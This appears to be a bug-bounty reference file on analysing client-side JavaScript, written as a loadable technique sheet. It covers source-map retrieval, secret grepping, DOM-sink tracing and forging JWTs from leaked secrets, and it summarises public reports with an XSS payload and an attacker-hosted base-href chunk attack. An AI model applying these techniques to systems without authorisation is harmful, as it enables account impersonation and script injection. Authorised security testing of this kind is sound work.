# JavaScript Analysis — HackerOne field guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Ordered by yield.



1. **Get the source map first.** `curl https://target/app.<hash>.js.map | jq -r '.sourcesContent[]'`. Original source with `process.env` / `REACT_APP_*` references is worth 100× the minified bundle. Report #638635 is the canonical example.

2. **Grep for secret names and prefixes** across all collected JS (patterns below). Triage hits: real key vs placeholder vs docs example.

3. **Extract endpoints** with LinkFinder or a string sweep. Feed unique paths to your HTTP client (`httpx`) and check for unauthenticated / undocumented endpoints.

4. **Find hidden parameters and GraphQL queries** in request-building code (`axios`, `fetch`, `ky`, GraphQL `.graphql` strings). Try them on live endpoints — hidden params are a classic IDOR/mass-assignment entry point.

5. **Trace DOM sinks** — `innerHTML`, `eval`, `Function`, `location`, `document.write`, `dangerouslySetInnerHTML`, `.html()`, `postMessage` listeners. This is where bundled JS pays as XSS.

6. **Decode every JWT-looking string** at jwt.io. Check whether the signing secret is also in the JS — if so, you can mint arbitrary tokens.

7. **Check for vulnerable libraries** (`retire.js`, npm advisory lookup) — a bundled old jQuery/React/Angular can be a known CVE with a ready PoC.



## Case studies



### 1. Source map → client-side JWT secret → arbitrary impersonation (Trint, #638635)



The reporter fetched `/static/js/app.e984c9df.js.map` next to the minified bundle. Its `sourcesContent` contained `ZendeskLoadingPage.js` with:



```js

const { REACT_APP_ZENDESK_SECRET } = process.env;

const zendeskToken = jwt.sign(payload, REACT_APP_ZENDESK_SECRET);

window.location = `${ZENDESK_DOMAIN}/access/jwt?jwt=${zendeskToken}`;

```



Grepping the map for `REACT_APP_ZENDESK_SECRET` yielded the literal secret. Anyone could mint a Zendesk SSO JWT for any email. **Takeaway: bundle inlining turns `process.env` into a public constant, and source maps hand you the variable name.**



### 2. postMessage followUpUrl → javascript: sink (HackerOne, #398054)



A `message` listener parsed JSON, dispatched `mktoResponse`, and the success callback set `location.href = findCorrectFollowUpUrl(data)`. An attacker-controlled `followUpUrl` of `javascript:alert(document.domain);//` reached the sink. CSP blocked execution in modern browsers, but the underlying DOM flaw was valid. **Takeaway: enumerate every `message` listener and follow `event.data` to its sink; check origin validation and URL schemes.**



### 3. Build-time env vars baked into webpack (Semrush, #1717210)



"During the build phase, not essential for the application's functionality environment variables were accidentally included in the webpack configuration" and exposed in the final bundle. **Takeaway: you don't need a source map to find this — grep the minified bundle for token-shaped strings and env-style names.**



### 4. Webpack chunk names as a CSP-bypass oracle (GitLab, #1481207)



After injecting a `<base href=https://attacker>` via Markdown, DevTools showed failed requests for `/assets/webpack/hello.<hash>.chunk.js`. Hosting files at those exact paths on the attacker domain made them load with the page's nonces → stored XSS. **Takeaway: the JS inventory from collection is itself an exploitation asset.**
